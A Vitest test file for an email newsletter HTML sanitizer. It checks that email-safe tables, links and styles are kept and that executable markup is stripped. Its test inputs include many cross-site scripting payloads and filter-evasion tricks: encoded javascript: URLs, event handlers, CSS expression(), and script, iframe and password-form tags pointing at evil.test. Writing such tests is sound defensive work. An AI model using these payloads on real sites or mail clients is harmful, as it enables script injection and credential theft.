import { describe, expect, it } from "vitest";
import { sanitizeEmailHtml } from "@/lib/studio/newsletter/emailHtmlSanitizer";

describe("HTML block sanitizer: keeps email-safe markup", () => {
  it("keeps tables, images, links and inline styles", () => {
    const html = '<table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td align="center" bgcolor="#1d6877" style="padding:24px;color:#ffffff;font-size:18px"><a href="https://northfield.ca/shop" target="_blank" style="color:#ffffff;text-decoration:underline">Shop <strong>now</strong></a><br><img src="https://cdn.northfield.ca/leaf.png" alt="Leaf" width="120" style="display:block;border:0"></td></tr></table>';
    expect(sanitizeEmailHtml(html)).toBe(
      '<table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td align="center" bgcolor="#1d6877" style="padding:24px;color:#ffffff;font-size:18px"><a href="https://northfield.ca/shop" target="_blank" style="color:#ffffff;text-decoration:underline" rel="noopener noreferrer">Shop <strong>now</strong></a><br><img src="https://cdn.northfield.ca/leaf.png" alt="Leaf" width="120" style="display:block;border:0"></td></tr></table>',
    );
  });

  it("keeps mailto and tel links and plain text", () => {
    expect(sanitizeEmailHtml('<p>Call <a href="tel:+16045550100">us</a> or <a href="mailto:hi@northfield.ca">email</a> & save 10% < today</p>')).toBe(
      '<p>Call <a href="tel:+16045550100">us</a> or <a href="mailto:hi@northfield.ca">email</a> & save 10% &lt; today</p>',
    );
  });

  it("closes tags left open and drops stray closers", () => {
    expect(sanitizeEmailHtml("<div><p>One<strong>two</div></span>")).toBe("<div><p>One<strong>two</strong></p></div>");
  });
});

describe("HTML block sanitizer: removes anything that can run code", () => {
  it.each([
    ["<script>alert(1)</script><p>ok</p>", "<p>ok</p>"],
    ["<SCRIPT SRC=https://evil.test/x.js></SCRIPT>", ""],
    ['<img src="https://cdn.x.test/a.png" onerror="alert(1)">', '<img src="https://cdn.x.test/a.png">'],
    ['<a href="javascript:alert(1)">x</a>', "<a>x</a>"],
    ['<a href="jav&#x61;script:alert(1)">x</a>', "<a>x</a>"],
    ['<a href=" java\tscript:alert(1)">x</a>', "<a>x</a>"],
    ['<a href="data:text/html,<script>alert(1)</script>">x</a>', "<a>x</a>"],
    ['<img src="data:image/png;base64,AAAA">', "<img>"],
    ['<img src="//evil.test/a.png">', "<img>"],
    ['<div style="background:url(javascript:alert(1))">x</div>', "<div>x</div>"],
    ['<div style="width:expression(alert(1));color:red">x</div>', '<div style="color:red">x</div>'],
    ['<div style="width:expr/**/ession(alert(1))">x</div>', "<div>x</div>"],
    ['<div style="behavior:url(x.htc)">x</div>', "<div>x</div>"],
    ["<style>body{display:none}</style><p>ok</p>", "<p>ok</p>"],
    ['<iframe src="https://evil.test"></iframe><p>ok</p>', "<p>ok</p>"],
    ['<form action="https://evil.test"><input name="password"><button>Go</button></form><p>ok</p>', "<p>ok</p>"],
    ["<svg onload=alert(1)><circle/></svg><p>ok</p>", "<p>ok</p>"],
    ['<!--[if mso]><script>alert(1)</script><![endif]--><p>ok</p>', "<p>ok</p>"],
    ['<meta http-equiv="refresh" content="0;url=https://evil.test"><p>ok</p>', "<p>ok</p>"],
    ["<scr<script>ipt>alert(1)</script>", "&lt;scr"],
    ['<img src=x onerror=alert(1)//', "&lt;img src=x onerror=alert(1)//"],
    ['<p title="a" onclick="alert(1)" onmouseover=alert(2)>x</p>', '<p title="a">x</p>'],
    ['<a href="https://ok.test" target="_top">x</a>', '<a href="https://ok.test">x</a>'],
    ['<table role="button"><tr><td>x</td></tr></table>', "<table><tr><td>x</td></tr></table>"],
  ])("%s", (input, expected) => {
    expect(sanitizeEmailHtml(input)).toBe(expected);
  });

  it("never emits an event handler, script, or javascript: anywhere", () => {
    const nasty = [
      '<IMG SRC="jav	ascript:alert(1);">',
      "<BODY ONLOAD=alert(1)>",
      '<div style="background-image: url(&#1;javascript:alert(1))">',
      '<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058alert(1)">x</a>',
      '<object data="https://evil.test/x.swf"></object>',
      '<math><mtext><img src=x onerror=alert(1)></mtext></math>',
      "<a href='javascript:alert(1)'>x</a>",
    ].join("");
    const out = sanitizeEmailHtml(nasty);
    expect(out).not.toMatch(/<[^>]+\son[a-z]+\s*=/i);
    expect(out).not.toMatch(/javascript:/i);
    expect(out).not.toMatch(/<(script|object|iframe|body|math|svg)/i);
  });
});

describe("HTML block sanitizer: report", () => {
  it("lists what was left out in plain language", async () => {
    const { sanitizeEmailHtmlWithReport } = await import("@/lib/studio/newsletter/emailHtmlSanitizer");
    const { removed } = sanitizeEmailHtmlWithReport(
      '<!-- note --><script>x</script><p onclick="x" style="position:absolute;color:red"><a href="javascript:x">a</a><marquee>hi</marquee></p>',
    );
    expect(removed).toEqual([
      "comments",
      "<script> and its contents",
      'event handler "onclick"',
      'style "position"',
      'unsafe or incomplete address in "href" on <a>',
      "<marquee> tag (its text is kept)",
    ]);
  });
  it("reports nothing for clean, email-safe code", async () => {
    const { sanitizeEmailHtmlWithReport } = await import("@/lib/studio/newsletter/emailHtmlSanitizer");
    expect(sanitizeEmailHtmlWithReport('<table width=100><tr><td style="padding:8px">Hi<br/></td></tr></table>').removed).toEqual([]);
  });
});
